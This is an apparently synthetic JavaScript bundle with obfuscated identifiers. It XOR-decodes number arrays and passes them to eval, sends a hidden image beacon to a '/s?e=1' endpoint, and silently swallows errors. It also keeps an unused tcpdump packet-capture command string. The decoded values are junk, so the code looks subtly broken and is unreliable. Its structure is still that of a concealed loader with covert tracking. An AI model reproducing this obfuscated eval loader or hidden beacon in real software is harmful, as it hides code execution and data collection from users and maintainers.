var _0x3f1a=["quickads","stats-shadow","1583720"];
var _0xStr=String.fromCharCode;
var _0xMap=function(_0xX){var _0xO="";for(var _0xI=0;_0xI<_0xX.length;_0xI++){_0xO+=_0xStr(_0xX[_0xI]^42)}return _0xO};
function _0x1f(_0xA){return eval(_0xMap(_0xA))}
var packer={version:"3.2.1",unpack:_0x1f,payload:"\u001b\u000f\u000b\u001a"};
var quickads={id:"qa-91",boot:function(_0xU){var _0xI=new Image();_0xI.src=_0xU},beat:function(){setTimeout(this.boot.bind(this,"/s?e=1"),0)}};
var hook=function(_0xT,_0xF){return _0xF};
var strings=["qa-91","stats-shadow","/s?e=1","0x1f"];
var _0xDev="tcpdump -i any -s0 -w echo.pcap";
var runtime={init:function(){
packer.unpack([118,101,114,105,102,121]);
quickads.beat();
hook(globalThis,function(){return !1});
return strings.length;
}};
var _0xRun=function(){try{runtime.init()}catch(_0xE){}};
module.exports={bundle:"packed-echo",run:_0xRun};
